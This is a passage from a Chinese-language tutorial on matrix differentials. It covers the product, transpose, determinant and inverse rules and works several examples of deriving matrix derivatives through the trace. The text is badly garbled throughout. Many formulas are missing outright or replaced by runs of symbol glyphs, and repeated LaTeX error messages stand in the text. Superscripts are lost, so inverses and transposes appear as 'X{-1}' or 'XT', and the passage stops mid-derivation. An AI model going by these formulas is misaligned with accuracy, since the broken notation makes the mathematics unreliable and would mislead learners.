它也是多元函数，设其可微，则它的全微分，仍是 (14) 式： 𝕕𝕕𝕕𝕕𝕕𝕕𝕕𝕕𝕕𝕕 我们从这个结果中发现，它其实就是矩阵 $(\\frac{\\partial f}{\\partial x_{ij}}){i=1,j=1}^{m,n}与矩阵(\\mathbb{d}x{ij})_{i=1,j=1}^{m,n}$ **对应位置的元素相乘并相加，**由 (6) 式可知， (19) 式也可以写成迹的形式，即： $$\\mathbb{d}f(\\pmb{X}) =\\frac{\\partial f}{\\partial x_{11}}\\mathbb{d}x_{11}+\\frac{\\partial f}{\\partial x_{12}}\\mathbb{d}x_{12} + \\cdots+\\frac{\\partial f}{\\partial x_{1n}}\\mathbb{d}x_{1n}+\\frac{\\partial f}{\\partial x_{21}}\\mathbb{d}x_{21}+\\frac{\\partial f}{\\partial x_{22}}\\mathbb{d}x_{22} + \\cdots+\\frac{\\partial f}{\\partial x_{2n}}\\mathbb{d}x_{2n}+\\cdots+\\frac{\\partial f}{\\partial x_{m1}}\\mathbb{d}x_{m1}+\\frac{\\partial f}{\\partial x_{m2}}\\mathbb{d}x_{m2} + \\cdots+\\frac{\\partial f}{\\partial x_{mn}}\\mathbb{d}x_{mn} =\\mathbb{tr}( {n\\times m} \\begin{bmatrix} \\mathbb{d}x{11} &amp; \\mathbb{d}x_{12} &amp; \\cdots &amp; \\mathbb{d}x_{1n} \\ \\mathbb{d}x_{21} &amp; \\mathbb{d}x_{22} &amp; \\cdots &amp; \\mathbb{d}x_{2n} \\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots\\ \\mathbb{d}x_{m1} &amp; \\mathbb{d}x_{m2} &amp; \\cdots &amp; \\mathbb{d}x_{mn} \\end{bmatrix}_{m \\times n} ) (20)$$ 3、矩阵变元的实矩阵函数[8] $$\\pmb{F}(\\pmb{X}),\\pmb{F}{p\\times q}=(f{ij}){i=1,j=1}^{p,q},\\pmb{X}{m \\times n}=(x_{ij})_{i=1,j=1}^{m,n} $$ 由**本质篇_一._3_3.3 可知，矩阵变元的实矩阵函数，它的每个元素其实就是一个矩阵变元的实值标量函数 。 我们定义：设 可微，则矩阵变元的实矩阵函数的矩阵微分，就是对每个位置的元素 求全微分，排列布局不变，即： $$\\mathbb{d}\\pmb{F}{p \\times q}(\\pmb{X}) = \\begin{bmatrix} \\mathbb{d}f{11}(\\pmb{X})&amp; \\mathbb{d}f_{12}(\\pmb{X}) &amp; \\cdots &amp; \\mathbb{d}f_{1q}(\\pmb{X}) \\ \\mathbb{d}f_{21}(\\pmb{X})&amp; \\mathbb{d}f_{22}(\\pmb{X}) &amp; \\cdots &amp; \\mathbb{d}f_{2q}(\\pmb{X}) \\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots \\ \\mathbb{d}f_{p1}(\\pmb{X})&amp; \\mathbb{d}f_{p2}(\\pmb{X}) &amp; \\cdots &amp; \\mathbb{d}f_{pq}(\\pmb{X}) \\end{bmatrix}_{p \\times q} (21)$$ 3.1 四个法则（很重要，下文需要用到，建议熟记） a. 常数矩阵的矩阵微分 $$\\mathbb{d}\\pmb{A}{m \\times n} = \\pmb{0}{m \\times n} (22_1)$$ 其中， 为常数矩阵。 证明： 的每个元素都是常数，由 (16_1) 得，每个元素的微分是 0 。 证毕。 b. 线性法则 相加再微分等于微分再相加，常数提外面 𝕕𝕕𝕕 其中， 为常数。 证明： 的每个元素都是 ，由 (16_2) 式可知，每个元素的全微分是 𝕕𝕕 。 证毕。 c. 乘积法则 前微后不微 + 前不微后微 Double subscripts: use braces to clarify\\mathbb{d}(\\pmb{F}(\\pmb{X})\\pmb{G}(\\pmb{X}))=\\mathbb{d}(\\pmb{F}(\\pmb{X}))\\pmb{G}(\\pmb{X}) + \\pmb{F}(\\pmb{X})\\mathbb{d}\\pmb{G}(\\pmb{X}) (22_3_1) 其中， $\\pmb{F}{p \\times q}(\\pmb{X}),\\pmb{G}{q \\times s}(\\pmb{X})为矩阵，且p,q,s$ 为任意整数。 注意：此时的微分是矩阵，不能交换乘积的左右顺序。 证明： 的每个元素都是 ，由 (16_2) 式、 (16_3) 式可知，每个元素的全微分是 Double subscripts: use braces to clarify\\mathbb{d}( \\sum_{k=1}^q[f_{ik}(\\pmb{X})g_{kj}(\\pmb{X})] ) =\\sum_{k=1}^q \\mathbb{d}(f_{ik}(\\pmb{X})g_{kj}(\\pmb{X})) = \\sum_{k=1}^q[\\mathbb{d}(f_{ik}(\\pmb{X}))g_{kj}(\\pmb{X})+f_{ik}(\\pmb{X})\\mathbb{d}g_{kj}(\\pmb{X})] = \\sum_{k=1}^q[\\mathbb{d}(f_{ik}(\\pmb{X}))g_{kj}(\\pmb{X})]+ \\sum_{k=1}^q[f_{ik}(\\pmb{X})\\mathbb{d}g_{kj}(\\pmb{X})] (22_3_1_a) 结果左边的求和式，就是 𝕕 的每个元素，结果右边的求和式，就是 𝕕 的每个元素。 证毕。 由此，很容易得到更多个乘积的法则： Double subscripts: use braces to clarify\\mathbb{d}(\\pmb{F}(\\pmb{X})\\pmb{G}(\\pmb{X})\\pmb{H}(\\pmb{X}))=\\mathbb{d}(\\pmb{F}(\\pmb{X}))\\pmb{G}(\\pmb{X})\\pmb{H}(\\pmb{X}) + \\pmb{F}(\\pmb{X})\\mathbb{d}(\\pmb{G}(\\pmb{X}))\\pmb{H}(\\pmb{X})+ \\pmb{F}(\\pmb{X})\\pmb{G}(\\pmb{X})\\mathbb{d}\\pmb{H}(\\pmb{X}) (22_3_2) 证明： Double subscripts: use braces to clarify\\mathbb{d}(\\pmb{F}(\\pmb{X})\\pmb{G}(\\pmb{X})\\pmb{H}(\\pmb{X})) = \\mathbb{d}(\\pmb{F}(\\pmb{X}))\\pmb{G}(\\pmb{X})\\pmb{H}(\\pmb{X})+\\pmb{F}(\\pmb{X})\\mathbb{d}(\\pmb{G}(\\pmb{X})\\pmb{H}(\\pmb{X})) = \\mathbb{d}(\\pmb{F}(\\pmb{X}))\\pmb{G}(\\pmb{X})\\pmb{H}(\\pmb{X}) +\\pmb{F}(\\pmb{X})[\\mathbb{d}(\\pmb{G}(\\pmb{X}))\\pmb{H}(\\pmb{X}) + \\pmb{G}(\\pmb{X})\\mathbb{d}\\pmb{H}(\\pmb{X})] =\\mathbb{d}(\\pmb{F}(\\pmb{X}))\\pmb{G}(\\pmb{X})\\pmb{H}(\\pmb{X}) + \\pmb{F}(\\pmb{X})\\mathbb{d}(\\pmb{G}(\\pmb{X}))\\pmb{H}(\\pmb{X})+ \\pmb{F}(\\pmb{X})\\pmb{G}(\\pmb{X})\\mathbb{d}\\pmb{H}(\\pmb{X}) (22_3_2_a) 证毕。 d. 转置法则 转置的矩阵微分等于矩阵微分的转置 Double subscripts: use braces to clarify\\mathbb{d}\\pmb{F}^T_{p \\times q}(\\pmb{X})= (\\mathbb{d}\\pmb{F}_{p \\times q}(\\pmb{X}))^T (22_4_1) 其中， 为矩阵。 证明： $$\\mathbb{d}\\pmb{F}^T_{p \\times q}(\\pmb{X}) = \\mathbb{d} {q \\times p} = \\begin{bmatrix} \\mathbb{d}f{11}(\\pmb{X})&amp; \\mathbb{d}f_{21}(\\pmb{X}) &amp; \\cdots &amp; \\mathbb{d}f_{p1}(\\pmb{X}) \\ \\mathbb{d}f_{12}(\\pmb{X})&amp; \\mathbb{d}f_{22}(\\pmb{X}) &amp; \\cdots &amp; \\mathbb{d}f_{p2}(\\pmb{X}) \\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots \\ \\mathbb{d}f_{1q}(\\pmb{X})&amp;\\mathbb{d}f_{2q}(\\pmb{X}) &amp; \\cdots &amp; \\mathbb{d}f_{pq}(\\pmb{X}) \\end{bmatrix}{q \\times p} = \\begin{bmatrix} \\mathbb{d}f{11}(\\pmb{X})&amp; \\mathbb{d}f_{12}(\\pmb{X}) &amp; \\cdots &amp; \\mathbb{d}f_{1q}(\\pmb{X}) \\ \\mathbb{d}f_{21}(\\pmb{X})&amp; \\mathbb{d}f_{22}(\\pmb{X}) &amp; \\cdots &amp; \\mathbb{d}f_{2q}(\\pmb{X}) \\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots \\ \\mathbb{d}f_{p1}(\\pmb{X})&amp; \\mathbb{d}f_{p2}(\\pmb{X}) &amp; \\cdots &amp; \\mathbb{d}f_{pq}(\\pmb{X}) \\end{bmatrix}{p \\times q}^T = (\\mathbb{d}\\pmb{F}{p \\times q}(\\pmb{X}))^T (22_4_2)$$ 证毕。 3.2 为什么要使用矩阵微分求导 $\\pmb{X}{m \\times n}自己就是矩阵变元为\\pmb{X}{m \\times n}的实矩阵函数，它的每个元素是，每个元素的全微分是\\mathbb d{x_{ij}}$ 。 因此， 的矩阵微分是： $$\\mathbb{d}\\pmb{X}{m \\times n} = \\begin{bmatrix} \\mathbb{d}x{11}&amp; \\mathbb{d}x_{12} &amp; \\cdots &amp; \\mathbb{d}x_{1n} \\ \\mathbb{d}x_{21}&amp; \\mathbb{d}x_{22} &amp; \\cdots &amp; \\mathbb{d}x_{2n} \\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots \\ \\mathbb{d}x_{m1}&amp; \\mathbb{d}x_{m2} &amp; \\cdots &amp; \\mathbb{d}x_{mn} \\ \\end{bmatrix}_{m \\times n} (23_1)$$ 向量 的矩阵微分是： 𝕕𝕕𝕕𝕕 于是，我们刚刚讲到的矩阵微分四个法则，对于 𝕕𝕕 也是适用的。 我们现在回到矩阵变元的实值标量函数的全微分，即 (20) 式： $$\\mathbb{d}f(\\pmb{X}) =\\frac{\\partial f}{\\partial x_{11}}\\mathbb{d}x_{11}+\\frac{\\partial f}{\\partial x_{12}}\\mathbb{d}x_{12} + \\cdots+\\frac{\\partial f}{\\partial x_{1n}}\\mathbb{d}x_{1n}+\\frac{\\partial f}{\\partial x_{21}}\\mathbb{d}x_{21}+\\frac{\\partial f}{\\partial x_{22}}\\mathbb{d}x_{22} + \\cdots+\\frac{\\partial f}{\\partial x_{2n}}\\mathbb{d}x_{2n}+\\cdots+\\frac{\\partial f}{\\partial x_{m1}}\\mathbb{d}x_{m1}+\\frac{\\partial f}{\\partial x_{m2}}\\mathbb{d}x_{m2} + \\cdots+\\frac{\\partial f}{\\partial x_{mn}}\\mathbb{d}x_{mn} =\\mathbb{tr}\\begin{pmatrix} {n\\times m} \\begin{bmatrix} \\mathbb{d}x{11} &amp; \\mathbb{d}x_{12} &amp; \\cdots &amp; \\mathbb{d}x_{1n} \\ \\mathbb{d}x_{21} &amp; \\mathbb{d}x_{22} &amp; \\cdots &amp; \\mathbb{d}x_{2n} \\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots\\ \\mathbb{d}x_{m1} &amp; \\mathbb{d}x_{m2} &amp; \\cdots &amp; \\mathbb{d}x_{mn} \\end{bmatrix}_{m \\times n} \\end{pmatrix} (20)$$ 观察 (20) 式的结果，发现在 𝕥𝕣 中，左边的矩阵，其实就是 (本质篇_9) 式： $$\\text{D}{\\pmb{X}}f(\\pmb{X})= \\frac{\\partial f(\\pmb{X})}{\\partial \\pmb{X}^T{m\\times n}} = _{n\\times m} \\ (本质篇_9)$$ 而右边的矩阵，其实就是 (23_1) 式： $$\\mathbb{d}\\pmb{X}{m \\times n} = \\begin{bmatrix} \\mathbb{d}x{11}&amp; \\mathbb{d}x_{12} &amp; \\cdots &amp; \\mathbb{d}x_{1n} \\ \\mathbb{d}x_{21}&amp; \\mathbb{d}x_{22} &amp; \\cdots &amp; \\mathbb{d}x_{2n} \\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots \\ \\mathbb{d}x_{m1}&amp; \\mathbb{d}x_{m2} &amp; \\cdots &amp; \\mathbb{d}x_{mn} \\ \\end{bmatrix}_{m \\times n} (23_1)$$ 因此，矩阵变元的实值标量函数的**全微分，**即 (20) 式，可以写成： 𝕕𝕥𝕣𝕕 别忘了我们的目标是什么，其实就是要求 。所以，只要我们可以把一个矩阵变元的实值标量函数的全微分写成 (24) 式，我们就找到了矩阵求导的结果。（已经有人证明[9]，这样的结果是唯一的。即若 𝕕𝕥𝕣𝕕𝕥𝕣𝕕，则 对于向量变元的实值标量函数的全微分，即 (18) 式，同样可以写成： 𝕕𝕥𝕣𝕕 而由本质篇_三._2.5_2.5.2 指出的，当矩阵变元 本身就是一个列向量 时 同时，由 (23_1) 式、 (23_2) 式，当矩阵 本身是列向量 时，也有 𝕕𝕕 所以，矩阵变元或向量变元的实值标量函数的矩阵求导的结果，都可以通过 (24) 式得到： 𝕕𝕥𝕣𝕕 那么，我们该如何写成形如 (24) 式的结果呢，别急，让我们先给出 个你应该记住的公式（以后就直接用了）。 3.2.1[8]夹层饼 Double subscripts: use braces to clarify\\mathbb{d}(\\pmb{A}\\pmb{X}\\pmb{B})=\\pmb{A}\\mathbb{d}(\\pmb{X})\\pmb{B} (25_1_1) 其中， $\\pmb{A}{p \\times m},\\pmb{B}{n \\times q}$ 是常数矩阵。 证明： 由乘积法则 (22_3_2) 式得： Double subscripts: use braces to clarify\\mathbb{d}(\\pmb{A}\\pmb{X}\\pmb{B}) = \\mathbb{d}(\\pmb{A})\\pmb{X}\\pmb{B} + \\pmb{A}\\mathbb{d}({\\pmb{X}})\\pmb{B} + \\pmb{A}\\pmb{X}\\mathbb{d}\\pmb{B} (25_1_a) 由常数矩阵微分 (22_1) 式得： $$\\mathbb{d}\\pmb{A} =\\pmb{0}{p \\times m},\\mathbb{d}\\pmb{B} =\\pmb{0}{n \\times q} (25_1_b)$$ 证毕。 可以代入其他任意的矩阵函数： Double subscripts: use braces to clarify\\mathbb{d}(\\pmb{A}\\pmb{F}(\\pmb{X})\\pmb{B})=\\pmb{A}\\mathbb{d}(\\pmb{F}(\\pmb{X}))\\pmb{B} (25_1_2) 3.2.2[10] 行列式 Double subscripts: use braces to clarify\\mathbb{d}|\\pmb{X}|= |\\pmb{X}|\\mathbb{tr}(\\pmb{X}^{-1}\\mathbb{d}\\pmb{X}) = \\mathbb{tr}(|\\pmb{X}|\\pmb{X}^{-1}\\mathbb{d}\\pmb{X}) (25_2_1) 其中， 是任意矩阵。 证明： 首先明确，行列式是一个实值标量函数，故可以使用 (24) 式。 我们知道，行列式可以按照一行展开，即一行中每个元素乘以他的代数余子式然后求和[11]。 我们按照元素 所在的第 i 行展开： Double subscripts: use braces to clarify|\\pmb{X}|=x_{i1}A_{i1}+x_{i2}A_{i2}+\\cdots+x_{in}A_{in} (25_2_a) 因此，行列式对元素 的偏导，即为该元素对应的代数余子式。 Double subscripts: use braces to clarify\\frac{\\partial |\\pmb{X}|}{\\partial x_{ij}} = A_{ij} (25_2_b) 因此，行列式对矩阵求导的结果为： Double subscripts: use braces to clarify\\frac{\\partial |\\pmb{X}|}{\\partial \\pmb{X}^T} = \\begin{bmatrix} A_{11} &amp; A_{21} &amp; \\cdots &amp; A_{n1} \\ A_{12} &amp; A_{22} &amp; \\cdots &amp; A_{n2} \\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\ A_{1n} &amp; A_{2n} &amp; \\cdots &amp; A_{nn} \\ \\end{bmatrix} (25_2_c) 这个结果其实就是伴随矩阵[12] 。 又因为伴随矩阵和逆矩阵的关系[13]： $$\\pmb{X}{-1}=\\frac{\\pmb{X}*}{|\\pmb{X}|} (25_2_d)$$ 代入 (24) 式得： 𝕕𝕥𝕣𝕕𝕥𝕣𝕕 又因为行列式是标量，由 (3) 式，可以提到迹的外面，得： Double subscripts: use braces to clarify\\mathbb{d}|\\pmb{X}|= |\\pmb{X}|\\mathbb{tr}(\\pmb{X}^{-1}\\mathbb{d}\\pmb{X}) = \\mathbb{tr}(|\\pmb{X}|\\pmb{X}^{-1}\\mathbb{d}\\pmb{X}) (25_2_1) 证毕。 可以代入其他任意的矩阵函数[10]： Double subscripts: use braces to clarify\\mathbb{d}|\\pmb{F}(\\pmb{X})|= |\\pmb{F}(\\pmb{X})|\\mathbb{tr}(\\pmb{F}(\\pmb{X})^{-1}\\mathbb{d}\\pmb{F}(\\pmb{X})) = \\mathbb{tr}(|\\pmb{F}(\\pmb{X})|\\pmb{F}(\\pmb{X})^{-1}\\mathbb{d}\\pmb{F}(\\pmb{X})) (25_2_2) 3.2.3[10] 逆矩阵 $$\\mathbb{d}(\\pmb{X}{-1})=-\\pmb{X}{-1}\\mathbb{d}(\\pmb{X})\\pmb{X}^{-1} (25_3_1)$$ 其中， 。 证明： 因为 而常数矩阵微分为 ，两边同时取矩阵微分得： $$ \\mathbb{d}(\\pmb{X})\\pmb{X}{-1}+\\pmb{X}\\mathbb{d}(\\pmb{X}{-1}) =\\pmb{0} (25_3_1)$$ 等式两边左乘 即得到结果。 证毕。 可以代入其他任意的矩阵函数[10]： $$\\mathbb{d}(\\pmb{F}(\\pmb{X}){-1})=-\\pmb{F}(\\pmb{X}){-1}\\mathbb{d}(\\pmb{F}(\\pmb{X}))\\pmb{F}(\\pmb{X})^{-1} (25_3_2)$$ 3.3 如何使用矩阵微分求导 对于实值标量函数 ，𝕥𝕣，𝕕𝕥𝕣𝕕 所以有 𝕕𝕕𝕥𝕣𝕥𝕣𝕕 如果实值标量函数本身就是某个矩阵函数 的迹，如 𝕥𝕣 ，则由全微分的线性法则 (16_2) 式，得： $$\\mathbb{d}(\\mathbb{tr}{\\pmb{F}{p\\times p}(\\pmb{X})}) = \\mathbb{d}(\\sum{i=1}^pf_{ii}(\\pmb{X})) = \\sum_{i=1}^p\\mathbb{d}(f_{ii}(\\pmb{X})) = \\mathbb{tr}(\\mathbb{d}F_{p \\times p}(\\pmb{X})) (27)$$ 我们以 6 个例子来非常非常详细地说明如何使用矩阵微分求导，例子的结论不需要记忆，会推过程才是最重要的，用的时候推一下就好了。 3.3.1 例子1 (基础篇_31) 式 $$\\frac{\\partial( \\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b})}{\\partial{\\pmb{X}}} = \\pmb{a}\\pmb{b}T\\pmb{X}+\\pmb{b}\\pmb{a}T\\pmb{X} (28)$$ 证明： **第一步：**写成 (26) 式的形式 $$\\mathbb{d}(\\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b})= \\mathbb{tr}(\\mathbb{d}(\\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b}))(29)$$ **第二步：**使用矩阵微分法则 (22_1) 式~ (22_4_1) 式，迹的若干性质 (2) 式~ (10) 式，六个基础公式 (25_1_1) 式~ (25_3_2) 式，将 (29) 式化简成形如 (24) 式的形式 由 (25_1_2) 式得： $$\\mathbb{d}(\\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b}) = \\mathbb{tr}(\\mathbb{d}(\\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b})) = \\mathbb{tr}(\\pmb{a}T\\mathbb{d}(\\pmb{X}\\pmb{X}T)\\pmb{b}) (30)$$ 由 (22_3_1) 式得： $$\\mathbb{d}(\\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b}) = \\mathbb{tr}(\\pmb{a}T\\mathbb{d}(\\pmb{X}\\pmb{X}T)\\pmb{b}) = \\mathbb{tr}[\\pmb{a}T(\\mathbb{d}(\\pmb{X})\\pmb{X}T+\\pmb{X}\\mathbb{d}\\pmb{X}^T)\\pmb{b}] (31)$$ 由 (3) 式得： $$\\mathbb{d}(\\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b}) = \\mathbb{tr}[\\pmb{a}T(\\mathbb{d}(\\pmb{X})\\pmb{X}T+\\pmb{X}\\mathbb{d}\\pmb{X}^T)\\pmb{b}] = \\mathbb{tr}(\\pmb{a}T\\mathbb{d}(\\pmb{X})\\pmb{X}T\\pmb{b})+\\mathbb{tr}(\\pmb{a}T\\pmb{X}\\mathbb{d}(\\pmb{X}T)\\pmb{b}) (32)$$ 由 (22_4_1) 式得： $$\\mathbb{d}(\\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b}) = \\mathbb{tr}(\\pmb{a}T\\mathbb{d}(\\pmb{X})\\pmb{X}T\\pmb{b})+\\mathbb{tr}(\\pmb{a}T\\pmb{X}\\mathbb{d}(\\pmb{X}T)\\pmb{b}) = \\mathbb{tr}(\\pmb{a}T\\mathbb{d}(\\pmb{X})\\pmb{X}T\\pmb{b})+\\mathbb{tr}(\\pmb{a}T\\pmb{X}(\\mathbb{d}\\pmb{X})T\\pmb{b}) (33)$$ 由 (9) 式， (10) 式得： $$\\mathbb{d}(\\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b}) = \\mathbb{tr}(\\pmb{a}T\\mathbb{d}(\\pmb{X})\\pmb{X}T\\pmb{b})+\\mathbb{tr}(\\pmb{a}T\\pmb{X}(\\mathbb{d}\\pmb{X})T\\pmb{b}) = \\mathbb{tr}(\\pmb{X}T\\pmb{b}\\pmb{a}T\\mathbb{d}\\pmb{X}) + \\mathbb{tr}(\\pmb{b}\\pmb{a}T\\pmb{X}(\\mathbb{d}\\pmb{X})T)= \\mathbb{tr}(\\pmb{X}T\\pmb{b}\\pmb{a}T\\mathbb{d}\\pmb{X}) + \\mathbb{tr}((\\pmb{b}\\pmb{a}T\\pmb{X})T\\mathbb{d}\\pmb{X})= \\mathbb{tr}(\\pmb{X}T\\pmb{b}\\pmb{a}T\\mathbb{d}\\pmb{X}) + \\mathbb{tr}(\\pmb{X}T\\pmb{a}\\pmb{b}T\\mathbb{d}\\pmb{X}) (34)$$ 由 (3) 式得： $$\\mathbb{d}(\\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b}) = \\mathbb{tr}(\\pmb{X}T\\pmb{b}\\pmb{a}T\\mathbb{d}\\pmb{X}) + \\mathbb{tr}(\\pmb{X}T\\pmb{a}\\pmb{b}T\\mathbb{d}\\pmb{X}) = \\mathbb{tr}((\\pmb{X}T\\pmb{b}\\pmb{a}T+\\pmb{X}T\\pmb{a}\\pmb{b}T)\\mathbb{d}\\pmb{X}) (35)$$ 第三步：得出结果 $$\\frac{\\partial( \\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b})}{\\partial{\\pmb{X}^T}} =\\pmb{X}T\\pmb{b}\\pmb{a}T+\\pmb{X}T\\pmb{a}\\pmb{b}T (36) \\frac{\\partial( \\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b})}{\\partial{\\pmb{X}}} = \\pmb{a}\\pmb{b}T\\pmb{X}+\\pmb{b}\\pmb{a}T\\pmb{X} (28)$$ 证毕。 3.3.2 例子2[9] 𝕥𝕣 **第一步：**写成 (27) 式的形式 𝕕𝕥𝕣𝕥𝕣𝕕 **第二步：**使用矩阵微分法则 (22_1) 式~ (22_4_1) 式，迹的若干性质 (2) 式~ (10) 式，六个基础公式 (25_1_1) 式~ (25_3_2) 式，将 (38) 式化简成形如 (24) 式的形式 由 (22_3_1) 式得： $$\\mathbb{d}(\\mathbb{tr}(\\pmb{X}^T\\pmb{X})) =\\mathbb{tr}(\\mathbb{d}(\\pmb{X}^T\\pmb{X})) = \\mathbb{tr}(\\mathbb{d}(\\pmb{X}T)\\pmb{X}+\\pmb{X}T\\mathbb{d}\\pmb{X}) (39)$$ 由 (3) 式得： $$\\mathbb{d}(\\mathbb{tr}(\\pmb{X}^T\\pmb{X})) = \\mathbb{tr}(\\mathbb{d}(\\pmb{X}T)\\pmb{X}+\\pmb{X}T\\mathbb{d}\\pmb{X}) = \\mathbb{tr}(\\mathbb{d}(\\pmb{X}T)\\pmb{X})+\\mathbb{tr}(\\pmb{X}T\\mathbb{d}\\pmb{X}) $$ 由 (22_4_1) 式得： $$\\mathbb{d}(\\mathbb{tr}(\\pmb{X}^T\\pmb{X})) = \\mathbb{tr}(\\mathbb{d}(\\pmb{X}T)\\pmb{X})+\\mathbb{tr}(\\pmb{X}T\\mathbb{d}\\pmb{X}) = \\mathbb{tr}((\\mathbb{d}\\pmb{X})T\\pmb{X})+\\mathbb{tr}(\\pmb{X}T\\mathbb{d}\\pmb{X})$$ 由 (8) 式、 (10) 式得： $$\\mathbb{d}(\\mathbb{tr}(\\pmb{X}^T\\pmb{X})) = \\mathbb{tr}((\\mathbb{d}\\pmb{X})T\\pmb{X})+\\mathbb{tr}(\\pmb{X}T\\mathbb{d}\\pmb{X}) = \\mathbb{tr}(\\pmb{X}(\\mathbb{d}\\pmb{X})T)+\\mathbb{tr}(\\pmb{X}T\\mathbb{d}\\pmb{X}) = \\mathbb{tr}(\\pmb{X}T\\mathbb{d}\\pmb{X})+\\mathbb{tr}(\\pmb{X}T\\mathbb{d}\\pmb{X})= 2 \\mathbb{tr}(\\pmb{X}^T\\mathbb{d}\\pmb{X})$$ 由 (3) 式得： 𝕕𝕥𝕣𝕥𝕣𝕕𝕥𝕣𝕕 第三步：得出结果 𝕥𝕣𝕥𝕣 3.3.3 例子3[14] $$\\frac{\\partial \\log|\\pmb{X}|}{\\partial \\pmb{X}} = (\\pmb{X}{-1})T (41)$$ 其中， 。 **第一步：**写成 (26) 式的形式 𝕕𝕥𝕣𝕕 **第二步：**使用矩阵微分法则 (22_1) 式~ (22_4_1) 式，迹的若干性质 (2) 式~ (10) 式，六个基础公式 (25_1_1) 式~ (25_3_2) 式，将 (42) 式化简成形如 (24) 式的形式 我们发现，这是一个复合函数的全微分， 是多元函数， 是一元函数，故由 (15) 式中的前两个等号，令 ，则 𝕕𝕥𝕣𝕕𝕥𝕣𝕕𝕥𝕣𝕕𝕥𝕣𝕕𝕥𝕣𝕕 由 (25_2_1) 式得： 𝕕𝕥𝕣𝕕𝕥𝕣𝕥𝕣𝕕 标量的迹还是标量，由 (2) 式得： 𝕕𝕥𝕣𝕥𝕣𝕕𝕥𝕣𝕕𝕥𝕣𝕕 第三步：得出结果 $$\\frac{\\partial \\log|\\pmb{X}|}{\\partial \\pmb{X}^T} = \\pmb{X}^{-1}\\ \\frac{\\partial \\log|\\pmb{X}|}{\\partial \\pmb{X}} = (\\pmb{X}{-1})T (46)$$ 3.3.4 例子4[14] $$\\frac{\\partial |\\pmb{X}^{-1}|}{\\partial \\pmb{X}} =-|\\pmb{X}{-1}|(\\pmb{X}{-1})^T (47)$$ 其中， 。 **第一步：**写成 (26) 式的形式，由 (25\\_2\\_2) 式得： $$\\mathbb{d} |\\pmb{X}^{-1}| = |\\pmb{X}{-1}|\\mathbb{tr}((\\pmb{X}{-1}){-1}\\mathbb{d}(\\pmb{X}{-1})) = |\\pmb{X}{-1}|\\mathbb{tr}(\\pmb{X}\\mathbb{d}(\\pmb{X}{-1})) (48)$$ **第二步：**使用矩阵微分法则 (22_1) 式~ (22_4_1) 式，迹的若干性质 (2) 式~ (10) 式，六个基础公式 (25_1_1) 式~ (25_3_2) 式，将 (48) 式化简成形如 (24) 式的形式 由 (25_3_1) 式得： $$\\mathbb{d} |\\pmb{X}^{-1}| = |\\pmb{X}{-1}|\\mathbb{tr}(\\pmb{X}\\mathbb{d}(\\pmb{X}{-1})) = |\\pmb{X}{-1}|\\mathbb{tr}(-\\pmb{X}\\pmb{X}{-1}\\mathbb{d}(\\pmb{X})\\pmb{X}^{-1}) = |\\pmb{X}{-1}|\\mathbb{tr}(-\\mathbb{d}(\\pmb{X})\\pmb{X}{-1}) (49)$$ 由 (3) 式得： $$\\mathbb{d} |\\pmb{X}^{-1}| = |\\pmb{X}{-1}|\\mathbb{tr}(-\\mathbb{d}(\\pmb{X})\\pmb{X}{-1}) = -|\\pmb{X}{-1}|\\mathbb{tr}(\\mathbb{d}(\\pmb{X})\\pmb{X}{-1}) (50)$$ 由 (8) 式得： $$\\mathbb{d} |\\pmb{X}^{-1}| = -|\\pmb{X}{-1}|\\mathbb{tr}(\\mathbb{d}(\\pmb{X})\\pmb{X}{-1}) = -|\\pmb{X}{-1}|\\mathbb{tr}(\\pmb{X}{-1}\\mathbb{d}\\pmb{X})$$ 由 (3) 式得： $$\\mathbb{d} |\\pmb{X}^{-1}| = -|\\pmb{X}{-1}|\\mathbb{tr}(\\pmb{X}{-1}\\mathbb{d}\\pmb{X}) = \\mathbb{tr}(-|\\pmb{X}{-1}|\\pmb{X}{-1}\\mathbb{d}(\\pmb{X})) (51)$$ 第三步：得出结果 $$\\frac{\\partial |\\pmb{X}^{-1}|}{\\partial \\pmb{X}^T} =-|\\pmb{X}{-1}|\\pmb{X}{-1} \\ \\frac{\\partial |\\pmb{X}^{-1}|}{\\partial \\pmb{X}} =-|\\pmb{X}{-1}|(\\pmb{X}{-1})^T (52)$$ 3.3.5 例子5[15] $$\\frac{\\partial \\mathbb{tr}(\\pmb{X}+\\pmb{A})^{-1}}{\\partial \\pmb{X}} =-((\\pmb{X}+\\pmb{A}){-2})T (53)$$ 其中， $\\pmb{A}{n \\times n}为常数矩阵，\\pmb{X}{n \\times n},(\\pmb{X}+\\pmb{A}){-2}=(\\pmb{X}+\\pmb{A}){-1}(\\pmb{X}+\\pmb{A})^{-1}$ 。 **第一步：**写成 (27) 式的形式 𝕕𝕥𝕣𝕥𝕣𝕕 **第二步：**使用矩阵微分法则 (22_1) 式~ (22_4_1) 式，迹的若干性质 (2) 式~ (10) 式，六个基础公式 (25_1_1) 式~ (25_3_2) 式，将 (54) 式化简成形如 (24) 式的形式 由 (25_3_2) 式得： $$\\mathbb{d} (\\mathbb{tr}(\\pmb{X}+\\pmb{A})^{-1}) = \\mathbb{tr}(\\mathbb{d}(\\pmb{X}+\\pmb{A})^{-1})= \\mathbb{tr}(-(\\pmb{X}+\\pmb{A}){-1}(\\mathbb{d}(\\pmb{X}+\\pmb{A}))(\\pmb{X}+\\pmb{A}){-1}) (55)$$ 由 (9) 式得： $$\\mathbb{d} (\\mathbb{tr}(\\pmb{X}+\\pmb{A})^{-1}) = 